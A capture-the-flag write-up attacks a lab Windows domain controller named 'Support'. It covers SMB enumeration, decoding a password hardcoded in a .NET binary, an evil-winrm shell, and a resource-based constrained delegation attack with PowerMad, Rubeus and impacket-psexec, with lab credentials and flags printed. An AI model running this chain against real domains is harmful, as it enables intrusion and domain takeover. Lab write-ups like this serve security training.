
# CTF Writeup: Support

---
## Reconaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sS -p- 10.129.230.181            
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-08 13:59 -0500
Stats: 0:02:44 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 64.64% done; ETC: 14:03 (0:01:30 remaining)
Nmap scan report for 10.129.230.181
Host is up (0.060s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49683/tcp open  unknown
49706/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 295.96 seconds
```

An more detailled scan revealed the following running services on the target server.

```
nmap -n -Pn -sSCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49683,49706 10.129.230.181
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-08 14:05 -0500
Nmap scan report for 10.129.230.181
Host is up (0.049s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-08 19:05:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-08T19:06:28
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.44 seconds
```

Judgding from the nmap scan we can guess that this isn't an ordinary windows machine, but an domain controller. Also it reveals the domain "support.htb". Let's map the target ip to the domain in our local dns file.

```
echo "10.129.230.181 support.htb" | tee -a /etc/hosts
```

Enumerated SMB Shares anonymously using the inbuilt tool "smbclient".

```
smbclient -L \\\\support.htb
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to support.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

There seems to be an non-default share named "support-tools". Let's try & access it!

It worked!

```
smbclient \\\\support.htb/support-tools
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \>
```

I downloaded the whole SMB Share to my local machine.

There is an interesting .zip file called "UserInfo.exe.zip", let's unzip it.

```
unzip UserInfo.exe.zip
```

I was able to get information about an internal running user called "runner" through path disclosure in the .dll file.

```
strings CommandLineParser.dll
/home/runner/work/CommandLineParser.Core/CommandLineParser.Core/CommandLineParser/obj/Release/netstandard2.0/CommandLineParser.pdb
```

I tried to utilize strings further especially for UserInfo.exe but it didn't give me anything useful. I tried to go further and used an Tool called "ILSpy" in order to decompile the .exe completly and view all its functions and to maybe find hardcoded credentials. Found it!

![[Pasted image 20260608220422.png]]

The password is called: 

```
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E=
```

it has the key for decryption "armando".

We were also able to find an potential user called "support".

![[Pasted image 20260608220722.png]]

I also found out the encoding algorithm is an modified version of XOR and utilized AI for the decoding and it prompted me the following command, which gave me the decoded password.

```
python3 -c 'import base64; enc=base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E="); key=b"armando"; print("".join(chr(enc[i] ^ key[i % len(key)] ^ 0xDF) for i in range(len(enc))))'
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

We now got valid credentials.

```
support:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Let's utilize the credentials in order to connect to LDAP. We will utilize an Tool called 
Apache Directory Studio for this.

Can be downloaded from **here**: https://directory.apache.org/studio/download/download-linux.html

```
./ApacheDirectoryStudio
```

1. Upon accessing it press on the button on the top-left.
2. Press right click in the "Connections" Tab and choose "New Connection"

Input Support as the connection name, support.htb as the hostname and click Next .

![[Pasted image 20260608225344.png]]

Input the previously retrieved credentials.

![[Pasted image 20260608225420.png]]

We can now view all the objects properly.

![[Pasted image 20260608225627.png]]

And found an "info" panel of user "support" with an password!

```
support:Ironside47pleasure40Watchful
```

Those are valid credentials!

```
nxc winrm support.htb -u 'support' -p 'Ironside47pleasure40Watchful'
WINRM       10.129.230.181  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
WINRM       10.129.230.181  5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

We connected to the target server via evil-winrm.

```
evil-winrm -i support.htb -u 'support' -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                            
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents>
```

Retrieved user.txt in C:\Users\support\Desktop

```
df242c0aa4b89c5b9714deb9aef602c1
```

## Privilege Escalation

Since we got an pair of valid credentials, let's utilize them to get domain information with bloodhound.

Downloaded domain information onto local machine.

```
bloodhound-python -u "support" -p 'Ironside47pleasure40Watchful' -ns 10.129.230.181 -d support.htb -c all
```

Started up bloodhound

```
bloodhound
```

Since it's running locally now I viewed it in the browser and uploaded the domain information.

Upon checking our users outbound object controls we realise that he is GenericAll on the Domain Controller itself!

![[Pasted image 20260608231911.png]]

Since we have GenericAll we will perform an RBCD Attack. Which creates an fake computer in order to request an TGT Ticket for the Administrator User!

The attack relies on three prerequisites: 

- We need a shell or code execution as a domain user that belongs to the Authenticated Users group. By default any member of this group can add up to 10 computers to the domain. 
- The ms-ds-machineaccountquota attribute needs to be higher than 0. This attribute controls the amount of computers that authenticated domain users can add to the domain.
- Our current user or a group that our user is a member of, needs to have WRITE privileges (GenericAll , WriteDACL) over a domain joined computer (in this case the Domain Controller).

---

1. Is User part of the "Authenticated Users" Group?

```
whoami /groups
```

2. Let's check the value of the ms-ds-machineaccountquota attribute. Is it 10?

```
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```

The output of the above command shows that this attribute is set to 10, which means each authenticated domain user can add up to 10 computers to the domain.

3. Next, let's verify that the msds-allowedtoactonbehalfofotheridentity attribute is empty. To do so, we need the PowerView module for PowerShell. We can upload it to the server via Evil-WinRM as shown previously. 

We can then import it with the following command

```
. ./PowerView.ps1
```

Once the module has been imported we can use the Get-DomainComputer commandlet to query the required information.

```
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```

If the output is empty, we can perform the RBCD Attack.

We will need PowerMad and Rubeus, which we can upload using Evil-WinRM as shown previously. PowerMad can be imported with the following command.

```
. ./Powermad.ps1
```

# Creating a Computer Object

Now, let's create a fake computer and add it to the domain. We can use PowerMad's New-MachineAccount to achieve this.

```
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

Verify it worked:

```
Get-ADComputer -identity FAKE-COMP01
```

# Configuring RBCD

Next, we will need to configure Resource-Based Constrained Delegation through one of two ways. We can either set the PrincipalsAllowedToDelegateToAccount value to FAKE-COMP01 through the builtin PowerShell Active Directory module, which will in turn configure the msds-allowedtoactonbehalfofotheridentity attribute on its own.

Let's use the Set-ADComputer command to configure RBCD.

```
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

To verify that the command worked run the following command:

```
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```

As we can see, the PrincipalsAllowedToDelegateToAccount is set to FAKE-COMP01 , which means the command worked. 

We can also verify the value of the msds-allowedtoactonbehalfofotheridentity

```
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
```

As we can see, the msds-allowedtoactonbehalfofotheridentity now has a value, but because the type of this attribute is Raw Security Descriptor we will have to convert the bytes to a string to understand what's going on.

First, let's grab the desired value and dump it to a variable called RawBytes .

```
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

Then, let's convert these bytes to a Raw Security Descriptor object.

```
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

Finally, we can print both the entire security descriptor, as well as the DiscretionaryAcl class, which represents the Access Control List that specifies the machines that can act on behalf of the DC.

```
$Descriptor
$Descriptor.DiscretionaryAcl
```

From the output we can see that the SecurityIdentifier is set to the SID of FAKE-COMP01 that we saw earlier, and the AceType is set to AccessAllowed 

# Performing a S4U Attack

It is now time to perform the S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the Administrator. 

We will be using Rubeus to perform this attack. First, we will need the hash of the password that was used to create the computer object.

```
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

Utilize the "rc4_hmac" hashed password.

```
58A478135A93AC3BF058A5EA0E8FDB71
```

Next, we can generate Kerberos tickets for the Administrator.
(Note: Break out evil-winrm and get an shell)

```
Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt /nowrap
```

Rubeus successfuly generated the tickets. We can now grab the last Base64 encoded ticket and use it on our local machine to get a shell on the DC as Administrator . To do so, copy the value of the last ticket and paste it inside a file called ticket.kirbi.b64

Note: Before pasting the value to the file make sure to remove any whitespace characters from the value.

Next, create a new file called ticket.kirbi with the Base64 decoded value of the previous ticket.

```
base64 -d ticket.kirbi.b64 > ticket.kirbi
```

Finally, we can convert this ticket to a format that Impacket can use. This can be achieved with Impackets TicketConverter.py

```
impacket-ticketConverter ticket.kirbi ticket.ccache                    
```

To acquire a shell we can use Impackets psexec.py 

```
KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
```

Retrieved root.txt in C:\Users\Administrator\Desktop

```
143d459c0169a30cd90929a78109993b
```